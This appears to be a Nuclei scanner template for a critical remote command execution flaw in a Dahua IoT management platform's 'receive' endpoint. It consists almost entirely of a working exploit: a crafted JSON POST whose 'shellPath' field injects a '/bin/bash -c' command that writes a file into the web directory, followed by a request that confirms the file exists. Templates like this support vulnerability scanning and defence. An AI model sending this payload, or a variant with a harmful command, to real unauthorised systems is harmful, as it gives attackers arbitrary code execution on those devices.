id: dahua-icc-receive-rce

info:
  name: 大华智能物联综合管理平台 receive 远程命令执行漏洞
  author: dahua
  severity: critical
variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /evo-runs/v1.0/receive HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Content-Type: application/json
        X-Subject-Headerflag: ADAPT

        {
          "method": "agent.ossm.mapping.config",
          "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
              "shellPath": "/bin/bash -c 'echo sectest > /opt/evoWpms/static/{{username}}.txt'",
              "filePath": "abc"
            },
            "requestIp": ""
          }
        }
      - |
        GET /static/{{username}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectest'
        condition: and
      - type: status
        status: 
          - 200